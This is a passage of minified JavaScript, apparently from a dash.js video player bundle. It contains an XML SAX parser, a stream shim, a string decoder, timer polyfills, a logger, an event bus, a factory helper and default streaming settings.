ha,ka,la=0,C="";C=w(ba,la++),this.c=C;)switch(this.trackPosition&&(this.position++,"\n"===C?(this.line++,this.column=0):this.column++),this.state){case V.BEGIN:if(this.state=V.BEGIN_WHITESPACE,"\ufeff"===C)continue;N(this,C);continue;case V.BEGIN_WHITESPACE:N(this,C);continue;case V.TEXT:if(this.sawRoot&&!this.closedRoot){for(var fa=la-1;C&&"<"!==C&&"&"!==C;)(C=w(ba,la++))&&this.trackPosition&&(this.position++,"\n"===C?(this.line++,this.column=0):this.column++);this.textNode+=ba.substring(fa,la-1)}"<"!==C||this.sawRoot&&this.closedRoot&&!this.strict?(!!g(Y,C)||this.sawRoot&&!this.closedRoot||E(this,"Text data outside of root node."),"&"===C?this.state=V.TEXT_ENTITY:this.textNode+=C):(this.state=V.OPEN_WAKA,this.startTagPosition=this.position);continue;case V.SCRIPT:"<"===C?this.state=V.SCRIPT_ENDING:this.script+=C;continue;case V.SCRIPT_ENDING:"/"===C?this.state=V.CLOSE_TAG:(this.script+="<"+C,this.state=V.SCRIPT);continue;case V.OPEN_WAKA:var qa;"!"===C?(this.state=V.SGML_DECL,this.sgmlDecl=""):g(Y,C)||(g(Z,C)?(this.state=V.OPEN_TAG,this.tagName=C):"/"===C?(this.state=V.CLOSE_TAG,this.tagName=""):"?"===C?(this.state=V.PROC_INST,this.procInstName=this.procInstBody=""):(E(this,"Unencoded <"),this.startTagPosition+1<this.position&&(qa=this.position-this.startTagPosition,C=Array(qa).join(" ")+C),this.textNode+="<"+C,this.state=V.TEXT));continue;case V.SGML_DECL:(this.sgmlDecl+C).toUpperCase()===aa?(t(this,"onopencdata"),this.state=V.CDATA,this.sgmlDecl="",this.cdata=""):"--"===this.sgmlDecl+C?(this.state=V.COMMENT,this.comment="",this.sgmlDecl=""):(this.sgmlDecl+C).toUpperCase()===ma?(this.state=V.DOCTYPE,(this.doctype||this.sawRoot)&&E(this,"Inappropriately located doctype declaration"),this.doctype="",this.sgmlDecl=""):">"===C?(t(this,"onsgmldeclaration",this.sgmlDecl),this.sgmlDecl="",this.state=V.TEXT):(g(ja,C)&&(this.state=V.SGML_DECL_QUOTED),this.sgmlDecl+=C);continue;case V.SGML_DECL_QUOTED:C===this.q&&(this.state=V.SGML_DECL,this.q=""),this.sgmlDecl+=C;continue;case V.DOCTYPE:">"===C?(this.state=V.TEXT,t(this,"ondoctype",this.doctype),this.doctype=!0):(this.doctype+=C,"["===C?this.state=V.DOCTYPE_DTD:g(ja,C)&&(this.state=V.DOCTYPE_QUOTED,this.q=C));continue;case V.DOCTYPE_QUOTED:this.doctype+=C,C===this.q&&(this.q="",this.state=V.DOCTYPE);continue;case V.DOCTYPE_DTD:this.doctype+=C,"]"===C?this.state=V.DOCTYPE:g(ja,C)&&(this.state=V.DOCTYPE_DTD_QUOTED,this.q=C);continue;case V.DOCTYPE_DTD_QUOTED:this.doctype+=C,C===this.q&&(this.state=V.DOCTYPE_DTD,this.q="");continue;case V.COMMENT:"-"===C?this.state=V.COMMENT_ENDING:this.comment+=C;continue;case V.COMMENT_ENDING:"-"===C?(this.state=V.COMMENT_ENDED,this.comment=x(this.opt,this.comment),this.comment&&t(this,"oncomment",this.comment),this.comment=""):(this.comment+="-"+C,this.state=V.COMMENT);continue;case V.COMMENT_ENDED:">"!==C?(E(this,"Malformed comment"),this.comment+="--"+C,this.state=V.COMMENT):this.state=V.TEXT;continue;case V.CDATA:"]"===C?this.state=V.CDATA_ENDING:this.cdata+=C;continue;case V.CDATA_ENDING:"]"===C?this.state=V.CDATA_ENDING_2:(this.cdata+="]"+C,this.state=V.CDATA);continue;case V.CDATA_ENDING_2:">"===C?(this.cdata&&t(this,"oncdata",this.cdata),t(this,"onclosecdata"),this.cdata="",this.state=V.TEXT):"]"===C?this.cdata+="]":(this.cdata+="]]"+C,this.state=V.CDATA);continue;case V.PROC_INST:"?"===C?this.state=V.PROC_INST_ENDING:g(Y,C)?this.state=V.PROC_INST_BODY:this.procInstName+=C;continue;case V.PROC_INST_BODY:if(!this.procInstBody&&g(Y,C))continue;"?"===C?this.state=V.PROC_INST_ENDING:this.procInstBody+=C;continue;case V.PROC_INST_ENDING:">"===C?(t(this,"onprocessinginstruction",{name:this.procInstName,body:this.procInstBody}),this.procInstName=this.procInstBody="",this.state=V.TEXT):(this.procInstBody+="?"+C,this.state=V.PROC_INST_BODY);continue;case V.OPEN_TAG:g(na,C)?this.tagName+=C:(function(va){va.strict||(va.tagName=va.tagName[va.looseCase]());var xa=va.tags[va.tags.length-1]||va,za=va.tag={name:va.tagName,attributes:{}};va.opt.xmlns&&(za.ns=xa.ns),va.attribList.length=0,t(va,"onopentagstart",za)}(this),">"===C?L(this):"/"===C?this.state=V.OPEN_TAG_SLASH:(!g(Y,C)&&E(this,"Invalid character in tag name"),this.state=V.ATTRIB));continue;case V.OPEN_TAG_SLASH:">"===C?(L(this,!0),G(this)):(E(this,"Forward-slash in opening tag not followed by >"),this.state=V.ATTRIB);continue;case V.ATTRIB:if(g(Y,C))continue;">"===C?L(this):"/"===C?this.state=V.OPEN_TAG_SLASH:g(Z,C)?(this.attribName=C,this.attribValue="",this.state=V.ATTRIB_NAME):E(this,"Invalid attribute name");continue;case V.ATTRIB_NAME:"="===C?this.state=V.ATTRIB_VALUE:">"===C?(E(this,"Attribute without value"),this.attribValue=this.attribName,I(this),L(this)):g(Y,C)?this.state=V.ATTRIB_NAME_SAW_WHITE:g(na,C)?this.attribName+=C:E(this,"Invalid attribute name");continue;case V.ATTRIB_NAME_SAW_WHITE:if("="===C)this.state=V.ATTRIB_VALUE;else{if(g(Y,C))continue;E(this,"Attribute without value"),this.attribValue=this.tag.attributes[this.attribName]="",t(this,"onattribute",{name:this.attribName,value:""}),this.attribName="",">"===C?L(this):g(Z,C)?(this.attribName=C,this.state=V.ATTRIB_NAME):(E(this,"Invalid attribute name"),this.state=V.ATTRIB)}continue;case V.ATTRIB_VALUE:if(g(Y,C))continue;g(ja,C)?(this.q=C,this.state=V.ATTRIB_VALUE_QUOTED):(E(this,"Unquoted attribute value"),this.state=V.ATTRIB_VALUE_UNQUOTED,this.attribValue=C);continue;case V.ATTRIB_VALUE_QUOTED:if(C!==this.q){"&"===C?this.state=V.ATTRIB_VALUE_ENTITY_Q:this.attribValue+=C;continue}I(this),this.q="",this.state=V.ATTRIB_VALUE_CLOSED;continue;case V.ATTRIB_VALUE_CLOSED:g(Y,C)?this.state=V.ATTRIB:">"===C?L(this):"/"===C?this.state=V.OPEN_TAG_SLASH:g(Z,C)?(E(this,"No whitespace between attributes"),this.attribName=C,this.attribValue="",this.state=V.ATTRIB_NAME):E(this,"Invalid attribute name");continue;case V.ATTRIB_VALUE_UNQUOTED:if(!g(W,C)){"&"===C?this.state=V.ATTRIB_VALUE_ENTITY_U:this.attribValue+=C;continue}I(this),">"===C?L(this):this.state=V.ATTRIB;continue;case V.CLOSE_TAG:if(this.tagName)">"===C?G(this):g(na,C)?this.tagName+=C:this.script?(this.script+="</"+this.tagName,this.tagName="",this.state=V.SCRIPT):(!g(Y,C)&&E(this,"Invalid tagname in closing tag"),this.state=V.CLOSE_TAG_SAW_WHITE);else{if(g(Y,C))continue;g(Z,C)?this.tagName=C:this.script?(this.script+="</"+C,this.state=V.SCRIPT):E(this,"Invalid tagname in closing tag.")}continue;case V.CLOSE_TAG_SAW_WHITE:if(g(Y,C))continue;">"===C?G(this):E(this,"Invalid characters in closing tag");continue;case V.TEXT_ENTITY:case V.ATTRIB_VALUE_ENTITY_Q:case V.ATTRIB_VALUE_ENTITY_U:switch(this.state){case V.TEXT_ENTITY:ha=V.TEXT,ka="textNode";break;case V.ATTRIB_VALUE_ENTITY_Q:ha=V.ATTRIB_VALUE_QUOTED,ka="attribValue";break;case V.ATTRIB_VALUE_ENTITY_U:ha=V.ATTRIB_VALUE_UNQUOTED,ka="attribValue"}";"===C?(this[ka]+=(xa=void 0,za=void 0,Ca=void 0,Ba=void 0,za=(va=this).entity,Ca=za.toLowerCase(),Ba="",va.ENTITIES[za]?va.ENTITIES[za]:va.ENTITIES[Ca]?va.ENTITIES[Ca]:("#"===(za=Ca).charAt(0)&&(Ba="x"===za.charAt(1)?(za=za.slice(2),(xa=parseInt(za,16)).toString(16)):(za=za.slice(1),(xa=parseInt(za,10)).toString(10))),za=za.replace(/^0+/,""),Ba.toLowerCase()===za?String.fromCodePoint(xa):(E(va,"Invalid character entity"),"&"+va.entity+";"))),this.entity="",this.state=ha):g(this.entity.length?pa:T,C)?this.entity+=C:(E(this,"Invalid character in entity name"),this[ka]+="&"+this.entity+C,this.entity="",this.state=ha);continue;default:throw Error(this,"Unknown state: "+this.state)}var va,xa,za,Ca,Ba;return this.position>=this.bufferCheckPosition&&function(va){for(var xa=Math.max(m.MAX_BUFFER_LENGTH,10),za=0,Ca=0,Ba=F.length;Ca<Ba;Ca++){var Ga=va[F[Ca]].length;if(xa<Ga)switch(F[Ca]){case"textNode":r(va);break;case"cdata":t(va,"oncdata",va.cdata),va.cdata="";break;case"script":t(va,"onscript",va.script),va.script="";break;default:z(va,"Max buffer length exceeded: "+F[Ca])}za=Math.max(za,Ga)}va.bufferCheckPosition=m.MAX_BUFFER_LENGTH-za+va.position}(this),this},resume:function(){return this.error=null,this},close:function(){return this.write(null)},flush:function(){r(this),""!==this.cdata&&(t(this,"oncdata",this.cdata),this.cdata=""),""!==this.script&&(t(this,"onscript",this.script),this.script="")}};try{var P=u(41).Stream}catch(ba){P=function(){}}var O=m.EVENTS.filter((function(ba){return"error"!==ba&&"end"!==ba}));(l.prototype=Object.create(P.prototype,{constructor:{value:l}})).write=function(ba){var ha;return"function"==typeof v&&"function"==typeof v.isBuffer&&v.isBuffer(ba)&&(this._decoder||(ha=u(42).StringDecoder,this._decoder=new ha("utf8")),ba=this._decoder.write(ba)),this._parser.write(ba.toString()),this.emit("data",ba),!0},l.prototype.end=function(ba){return ba&&ba.length&&this.write(ba),this._parser.end(),!0},l.prototype.on=function(ba,ha){var ka=this;return ka._parser["on"+ba]||-1===O.indexOf(ba)||(ka._parser["on"+ba]=function(){var la=1===arguments.length?[arguments[0]]:Array.apply(null,arguments);la.splice(0,0,ba),ka.emit.apply(ka,la)}),P.prototype.on.call(ka,ba,ha)};var R="0124356789",Q="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",ja="'\"",W=(Y="\r\n\t ")+">",aa="[CDATA[",ma="DOCTYPE",H="http://www.w3.org/XML/1998/namespace",B="http://www.w3.org/2000/xmlns/",A={xml:H,xmlns:B},Y=f(Y);R=f(R),Q=f(Q);var Z=/[:_A-Za-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD]/,na=/[:_A-Za-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\u00B7\u0300-\u036F\u203F-\u2040\.\d-]/,T=/[#:_A-Za-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD]/,pa=/[#:_A-Za-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\u00B7\u0300-\u036F\u203F-\u2040\.\d-]/;ja=f(ja),W=f(W);var ia,S,oa,V=0;for(oa in m.STATE={BEGIN:V++,BEGIN_WHITESPACE:V++,TEXT:V++,TEXT_ENTITY:V++,OPEN_WAKA:V++,SGML_DECL:V++,SGML_DECL_QUOTED:V++,DOCTYPE:V++,DOCTYPE_QUOTED:V++,DOCTYPE_DTD:V++,DOCTYPE_DTD_QUOTED:V++,COMMENT_STARTING:V++,COMMENT:V++,COMMENT_ENDING:V++,COMMENT_ENDED:V++,CDATA:V++,CDATA_ENDING:V++,CDATA_ENDING_2:V++,PROC_INST:V++,PROC_INST_BODY:V++,PROC_INST_ENDING:V++,OPEN_TAG:V++,OPEN_TAG_SLASH:V++,ATTRIB:V++,ATTRIB_NAME:V++,ATTRIB_NAME_SAW_WHITE:V++,ATTRIB_VALUE:V++,ATTRIB_VALUE_QUOTED:V++,ATTRIB_VALUE_CLOSED:V++,ATTRIB_VALUE_UNQUOTED:V++,ATTRIB_VALUE_ENTITY_Q:V++,ATTRIB_VALUE_ENTITY_U:V++,CLOSE_TAG:V++,CLOSE_TAG_SAW_WHITE:V++,SCRIPT:V++,SCRIPT_ENDING:V++},m.XML_ENTITIES={amp:"&",gt:">",lt:"<",quot:'"',apos:"'"},m.ENTITIES={amp:"&",gt:">",lt:"<",quot:'"',apos:"'",AElig:198,Aacute:193,Acirc:194,Agrave:192,Aring:197,Atilde:195,Auml:196,Ccedil:199,ETH:208,Eacute:201,Ecirc:202,Egrave:200,Euml:203,Iacute:205,Icirc:206,Igrave:204,Iuml:207,Ntilde:209,Oacute:211,Ocirc:212,Ograve:210,Oslash:216,Otilde:213,Ouml:214,THORN:222,Uacute:218,Ucirc:219,Ugrave:217,Uuml:220,Yacute:221,aacute:225,acirc:226,aelig:230,agrave:224,aring:229,atilde:227,auml:228,ccedil:231,eacute:233,ecirc:234,egrave:232,eth:240,euml:235,iacute:237,icirc:238,igrave:236,iuml:239,ntilde:241,oacute:243,ocirc:244,ograve:242,oslash:248,otilde:245,ouml:246,szlig:223,thorn:254,uacute:250,ucirc:251,ugrave:249,uuml:252,yacute:253,yuml:255,copy:169,reg:174,nbsp:160,iexcl:161,cent:162,pound:163,curren:164,yen:165,brvbar:166,sect:167,uml:168,ordf:170,laquo:171,not:172,shy:173,macr:175,deg:176,plusmn:177,sup1:185,sup2:178,sup3:179,acute:180,micro:181,para:182,middot:183,cedil:184,ordm:186,raquo:187,frac14:188,frac12:189,frac34:190,iquest:191,times:215,divide:247,OElig:338,oelig:339,Scaron:352,scaron:353,Yuml:376,fnof:402,circ:710,tilde:732,Alpha:913,Beta:914,Gamma:915,Delta:916,Epsilon:917,Zeta:918,Eta:919,Theta:920,Iota:921,Kappa:922,Lambda:923,Mu:924,Nu:925,Xi:926,Omicron:927,Pi:928,Rho:929,Sigma:931,Tau:932,Upsilon:933,Phi:934,Chi:935,Psi:936,Omega:937,alpha:945,beta:946,gamma:947,delta:948,epsilon:949,zeta:950,eta:951,theta:952,iota:953,kappa:954,lambda:955,mu:956,nu:957,xi:958,omicron:959,pi:960,rho:961,sigmaf:962,sigma:963,tau:964,upsilon:965,phi:966,chi:967,psi:968,omega:969,thetasym:977,upsih:978,piv:982,ensp:8194,emsp:8195,thinsp:8201,zwnj:8204,zwj:8205,lrm:8206,rlm:8207,ndash:8211,mdash:8212,lsquo:8216,rsquo:8217,sbquo:8218,ldquo:8220,rdquo:8221,bdquo:8222,dagger:8224,Dagger:8225,bull:8226,hellip:8230,permil:8240,prime:8242,Prime:8243,lsaquo:8249,rsaquo:8250,oline:8254,frasl:8260,euro:8364,image:8465,weierp:8472,real:8476,trade:8482,alefsym:8501,larr:8592,uarr:8593,rarr:8594,darr:8595,harr:8596,crarr:8629,lArr:8656,uArr:8657,rArr:8658,dArr:8659,hArr:8660,forall:8704,part:8706,exist:8707,empty:8709,nabla:8711,isin:8712,notin:8713,ni:8715,prod:8719,sum:8721,minus:8722,lowast:8727,radic:8730,prop:8733,infin:8734,ang:8736,and:8743,or:8744,cap:8745,cup:8746,int:8747,there4:8756,sim:8764,cong:8773,asymp:8776,ne:8800,equiv:8801,le:8804,ge:8805,sub:8834,sup:8835,nsub:8836,sube:8838,supe:8839,oplus:8853,otimes:8855,perp:8869,sdot:8901,lceil:8968,rceil:8969,lfloor:8970,rfloor:8971,lang:9001,rang:9002,loz:9674,spades:9824,clubs:9827,hearts:9829,diams:9830},Object.keys(m.ENTITIES).forEach((function(ba){var ha=m.ENTITIES[ba];ha="number"==typeof ha?String.fromCharCode(ha):ha,m.ENTITIES[ba]=ha})),m.STATE)m.STATE[m.STATE[oa]]=oa;V=m.STATE,String.fromCodePoint||(ia=String.fromCharCode,S=Math.floor,Object.defineProperty?Object.defineProperty(String,"fromCodePoint",{value:h,configurable:!0,writable:!0}):String.fromCodePoint=h)}(void 0===M?this.sax={}:M)}).call(this,u(8).Buffer)},{41:41,42:42,8:8}],41:[function(u,da,M){function v(){m.call(this)}da.exports=v;var m=u(11).EventEmitter;u(21)(v,m),v.Readable=u(36),v.Writable=u(38),v.Duplex=u(26),v.Transform=u(37),v.PassThrough=u(35),(v.Stream=v).prototype.pipe=function(p,l){function f(D){p.writable&&!1===p.write(D)&&J.pause&&J.pause()}function g(){J.readable&&J.resume&&J.resume()}function t(){E||(E=!0,p.end())}function r(){E||(E=!0,"function"==typeof p.destroy&&p.destroy())}function x(D){if(z(),0===m.listenerCount(this,"error"))throw D}function z(){J.removeListener("data",f),p.removeListener("drain",g),J.removeListener("end",t),J.removeListener("close",r),J.removeListener("error",x),p.removeListener("error",x),J.removeListener("end",z),J.removeListener("close",z),p.removeListener("close",z)}var J=this;J.on("data",f),p.on("drain",g),p._isStdio||l&&!1===l.end||(J.on("end",t),J.on("close",r));var E=!1;return J.on("error",x),p.on("error",x),J.on("end",z),J.on("close",z),p.on("close",z),p.emit("pipe",J),p}},{11:11,21:21,26:26,35:35,36:36,37:37,38:38}],42:[function(u,da,M){function m(D){switch(this.encoding=function v(D){var I=function(L){if(!L)return"utf8";for(var G;;)switch(L){case"utf8":case"utf-8":return"utf8";case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return"utf16le";case"latin1":case"binary":return"latin1";case"base64":case"ascii":case"hex":return L;default:if(G)return;L=(""+L).toLowerCase(),G=!0}}(D);if("string"!=typeof I&&(J.isEncoding===E||!E(D)))throw Error("Unknown encoding: "+D);return I||D}(D),this.encoding){case"utf16le":this.text=f,this.end=g,D=4;break;case"utf8":this.fillLast=l,D=4;break;case"base64":this.text=t,this.end=r,D=3;break;default:return this.write=x,void(this.end=z)}this.lastTotal=this.lastNeed=0,this.lastChar=J.allocUnsafe(D)}function p(D){return 127>=D?0:6==D>>5?2:14==D>>4?3:30==D>>3?4:2==D>>6?-1:-2}function l(D){var I=this.lastTotal-this.lastNeed;a:if(128!=(192&D[0]))var L=(this.lastNeed=0,"");else{if(1<this.lastNeed&&1<D.length){if(128!=(192&D[1])){this.lastNeed=1,L="";break a}if(2<this.lastNeed&&2<D.length&&128!=(192&D[2])){this.lastNeed=2,L="";break a}}L=void 0}return void 0!==L?L:this.lastNeed<=D.length?(D.copy(this.lastChar,I,0,this.lastNeed),this.lastChar.toString(this.encoding,0,this.lastTotal)):(D.copy(this.lastChar,I,0,D.length),void(this.lastNeed-=D.length))}function f(D,I){if(0!=(D.length-I)%2)return this.lastNeed=1,this.lastTotal=2,this.lastChar[0]=D[D.length-1],D.toString("utf16le",I,D.length-1);if(I=D.toString("utf16le",I)){var L=I.charCodeAt(I.length-1);if(55296<=L&&56319>=L)return this.lastNeed=2,this.lastTotal=4,this.lastChar[0]=D[D.length-2],this.lastChar[1]=D[D.length-1],I.slice(0,-1)}return I}function g(D){return D=D&&D.length?this.write(D):"",this.lastNeed?D+this.lastChar.toString("utf16le",0,this.lastTotal-this.lastNeed):D}function t(D,I){var L=(D.length-I)%3;return 0==L?D.toString("base64",I):(this.lastNeed=3-L,this.lastTotal=3,1==L?this.lastChar[0]=D[D.length-1]:(this.lastChar[0]=D[D.length-2],this.lastChar[1]=D[D.length-1]),D.toString("base64",I,D.length-L))}function r(D){return D=D&&D.length?this.write(D):"",this.lastNeed?D+this.lastChar.toString("base64",0,3-this.lastNeed):D}function x(D){return D.toString(this.encoding)}function z(D){return D&&D.length?this.write(D):""}var J=u(39).Buffer,E=J.isEncoding||function(D){switch((D=""+D)&&D.toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":case"raw":return!0;default:return!1}};(M.StringDecoder=m).prototype.write=function(D){if(0===D.length)return"";var I;if(this.lastNeed){if(void 0===(I=this.fillLast(D)))return"";var L=this.lastNeed;this.lastNeed=0}else L=0;return L<D.length?I?I+this.text(D,L):this.text(D,L):I||""},m.prototype.end=function(D){return D=D&&D.length?this.write(D):"",this.lastNeed?D+"":D},m.prototype.text=function(D,I){var L=D.length-1;if(L<I)L=0;else{var G=p(D[L]);L=0<=G?(0<G&&(this.lastNeed=G-1),G):--L<I||-2===G?0:0<=(G=p(D[L]))?(0<G&&(this.lastNeed=G-2),G):--L<I||-2===G?0:0<=(G=p(D[L]))?(0<G&&(2===G?G=0:this.lastNeed=G-3),G):0}return this.lastNeed?(this.lastTotal=L,G=D.length-(L-this.lastNeed),D.copy(this.lastChar,0,G),D.toString("utf8",I,G)):D.toString("utf8",I)},m.prototype.fillLast=function(D){if(this.lastNeed<=D.length)return D.copy(this.lastChar,this.lastTotal-this.lastNeed,0,this.lastNeed),this.lastChar.toString(this.encoding,0,this.lastTotal);D.copy(this.lastChar,this.lastTotal-this.lastNeed,0,D.length),this.lastNeed-=D.length}},{39:39}],43:[function(u,da,M){(function(v,m){function p(x,z){this._id=x,this._clearFn=z}var l=u(25).nextTick,f=Function.prototype.apply,g=Array.prototype.slice,t={},r=0;M.setTimeout=function(){return new p(f.call(setTimeout,wa,arguments),clearTimeout)},M.setInterval=function(){return new p(f.call(setInterval,wa,arguments),clearInterval)},M.clearTimeout=M.clearInterval=function(x){x.close()},p.prototype.unref=p.prototype.ref=function(){},p.prototype.close=function(){this._clearFn.call(wa,this._id)},M.enroll=function(x,z){clearTimeout(x._idleTimeoutId),x._idleTimeout=z},M.unenroll=function(x){clearTimeout(x._idleTimeoutId),x._idleTimeout=-1},M._unrefActive=M.active=function(x){clearTimeout(x._idleTimeoutId);var z=x._idleTimeout;0<=z&&(x._idleTimeoutId=setTimeout((function(){x._onTimeout&&x._onTimeout()}),z))},M.setImmediate="function"==typeof v?v:function(x){var z=r++,J=!(2>arguments.length)&&g.call(arguments,1);return t[z]=!0,l((function(){t[z]&&(J?x.apply(null,J):x.call(null),M.clearImmediate(z))})),z},M.clearImmediate="function"==typeof m?m:function(x){delete t[x]}}).call(this,u(43).setImmediate,u(43).clearImmediate)},{25:25,43:43}],44:[function(u,da,M){(function(v){function m(p){try{if(!v.localStorage)return}catch(l){return}return null!=(p=v.localStorage[p])&&"true"===String(p).toLowerCase()}da.exports=function(p,l){if(m("noDeprecation"))return p;var f=!1;return function(){if(!f){if(m("throwDeprecation"))throw Error(l);m("traceDeprecation")?console.trace(l):console.warn(l),f=!0}return p.apply(this,arguments)}}}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:void 0!==wa?wa:{})},{}],45:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g){function t(N){return N&&N.bind?N.bind(wa.console):wa.console.log.bind(wa.console)}function r(N,w){var h="",F=null;I&&(F=(new Date).getTime(),h+="["+(F-G)+"]"),L&&w&&w.getClassName&&(h+="["+w.getClassName()+"]",w.getType&&(h+="["+w.getType()+"]")),0<h.length&&(h+=" "),F=arguments.length;for(var P=Array(2<F?F-2:0),O=2;O<F;O++)P[O-2]=arguments[O];Array.apply(null,P).forEach((function(R){h+=R+" "})),D[N]&&E.get().debug.logLevel>=N&&D[N](h),J.trigger(l.default.LOG,{message:h,level:N})}g=g||{};var x,z=this.context,J=(0,p.default)(z).getInstance(),E=g.settings,D=[],I=void 0,L=void 0,G=void 0;return x={getLogger:function(N){return{fatal:function(){for(var w=arguments.length,h=Array(w),F=0;F<w;F++)h[F]=arguments[F];r.apply(void 0,[1,this].concat(h))}.bind(N),error:function(){for(var w=arguments.length,h=Array(w),F=0;F<w;F++)h[F]=arguments[F];r.apply(void 0,[2,this].concat(h))}.bind(N),warn:function(){for(var w=arguments.length,h=Array(w),F=0;F<w;F++)h[F]=arguments[F];r.apply(void 0,[3,this].concat(h))}.bind(N),info:function(){for(var w=arguments.length,h=Array(w),F=0;F<w;F++)h[F]=arguments[F];r.apply(void 0,[4,this].concat(h))}.bind(N),debug:function(){for(var w=arguments.length,h=Array(w),F=0;F<w;F++)h[F]=arguments[F];r.apply(void 0,[5,this].concat(h))}.bind(N)}},setLogTimestampVisible:function(N){I=N},setCalleeNameVisible:function(N){L=N}},L=I=!0,G=(new Date).getTime(),void 0!==wa&&wa.console&&(D[1]=t(wa.console.error),D[2]=t(wa.console.error),D[3]=t(wa.console.warn),D[4]=t(wa.console.info),D[5]=t(wa.console.debug)),x}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(46)),l=v(u(54));u=v(u(47)),m.__dashjs_factory_name="Debug";var f=u.default.getSingletonFactory(m);f.LOG_LEVEL_NONE=0,f.LOG_LEVEL_FATAL=1,f.LOG_LEVEL_ERROR=2,f.LOG_LEVEL_WARNING=3,f.LOG_LEVEL_INFO=4,f.LOG_LEVEL_DEBUG=5,u.default.updateSingletonFactory(m.__dashjs_factory_name,f),M.default=f,da.exports=M.default},{46:46,47:47,54:54}],46:[function(u,da,M){function v(){function p(f,g,t){var r=-1;return l[f]&&l[f].some((function(x,z){if(x&&x.callback===g&&(!t||t===x.scope))return r=z,!0})),r}var l={};return{on:function(f,g,t){var r,x=3>=arguments.length||void 0===arguments[3]?0:arguments[3];if(!f)throw Error("event type cannot be null or undefined");if(!g||"function"!=typeof g)throw Error("listener must be a function: "+g);0<=p(f,g,t)||(l[f]=l[f]||[],r={callback:g,scope:t,priority:x},l[f].some((function(z,J){if(z&&x>z.priority)return l[f].splice(J,0,r),!0}))||l[f].push(r))},off:function(f,g,t){var r;f&&g&&l[f]&&(0>(r=p(f,g,t))||(l[f][r]=null))},trigger:function(f,g){if(f&&l[f]){if((g=g||{}).hasOwnProperty("type"))throw Error("'type' is a reserved word for event dispatching");g.type=f,l[f]=l[f].filter((function(t){return t})),l[f].forEach((function(t){return t&&t.callback.call(t.scope,g)}))}},reset:function(){l={}}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="EventBus",(m=u.default.getSingletonFactory(v)).EVENT_PRIORITY_LOW=0,m.EVENT_PRIORITY_HIGH=5e3,u.default.updateSingletonFactory(v.__dashjs_factory_name,m),M.default=m,da.exports=M.default},{47:47}],47:[function(u,da,M){function v(t,r){for(var x in l){var z=l[x];if(z.context===t&&z.name===r)return z.instance}return null}function m(t,r,x){var z=void 0,J=t.__dashjs_factory_name,E=r[J];if(E){var D=E.instance;if(!E.override)return D.apply({context:r,factory:p},x);for(var I in z=t.apply({context:r},x),D=D.apply({context:r,factory:p,parent:z},x))z.hasOwnProperty(I)&&(z[I]=D[I])}else z=t.apply({context:r},x);return z.getClassName=function(){return J},z}var p,l,f,g;Object.defineProperty(M,"__esModule",{value:!0}),p=void 0,l=[],f={},g={},u=p={extend:function(t,r,x,z){!z[t]&&r&&(z[t]={instance:r,override:x})},getSingletonInstance:v,setSingletonInstance:function(t,r,x){for(var z in l){var J=l[z];if(J.context===t&&J.name===r)return void(l[z].instance=x)}l.push({name:r,context:t,instance:x})},getSingletonFactory:function(t){var r=f[t.__dashjs_factory_name];return r||(r=function(x){var z=void 0;return void 0===x&&(x={}),{getInstance:function(){return(z=z||v(x,t.__dashjs_factory_name))||(z=m(t,x,arguments),l.push({name:t.__dashjs_factory_name,context:x,instance:z})),z}}},f[t.__dashjs_factory_name]=r),r},getSingletonFactoryByName:function(t){return f[t]},updateSingletonFactory:function(t,r){t in f&&(f[t]=r)},getClassFactory:function(t){var r=g[t.__dashjs_factory_name];return r||(r=function(x){return void 0===x&&(x={}),{create:function(){return m(t,x,arguments)}}},g[t.__dashjs_factory_name]=r),r},getClassFactoryByName:function(t){return g[t]},updateClassFactory:function(t,r){t in g&&(g[t]=r)}},M.default=u,da.exports=M.default},{}],48:[function(u,da,M){function v(x){return x&&x.__esModule?x:{default:x}}function m(x,z,J){return z in x?Object.defineProperty(x,z,{value:J,enumerable:!0,configurable:!0,writable:!0}):x[z]=J,x}function p(){var x,z,J={debug:{logLevel:g.default.LOG_LEVEL_WARNING},streaming:{metricsMaxListDepth:1e3,abandonLoadTimeout:1e4,liveDelayFragmentCount:NaN,liveDelay:null,scheduleWhilePaused:!0,fastSwitchEnabled:!1,bufferPruningInterval:10,bufferToKeep:20,bufferAheadToKeep:80,jumpGaps:!0,smallGapLimit:1.5,stableBufferTime:12,bufferTimeAtTopQuality:30,bufferTimeAtTopQualityLongForm:60,longFormContentDurationThreshold:600,wallclockTimeUpdateInterval:50,lowLatencyEnabled:!1,keepProtectionMediaKeys:!1,useManifestDateHeaderTimeSource:!0,useSuggestedPresentationDelay:!0,useAppendWindowEnd:!0,manifestUpdateRetryInterval:100,liveCatchUpMinDrift:.02,liveCatchUpMaxDrift:0,liveCatchUpPlaybackRate:.5,liveCatchupLatencyThreshold:NaN,lastBitrateCachingInfo:{enabled:!0,ttl:36e4},lastMediaSettingsCachingInfo:{enabled:!0,ttl:36e4},cacheLoadThresholds:{video:50,audio:5},retryIntervals:(m(x={},r.HTTPRequest.MPD_TYPE,500),m(x,r.HTTPRequest.XLINK_EXPANSION_TYPE,500),m(x,r.HTTPRequest.MEDIA_SEGMENT_TYPE,1e3),m(x,r.HTTPRequest.INIT_SEGMENT_TYPE,1e3),m(x,r.HTTPRequest.BITSTR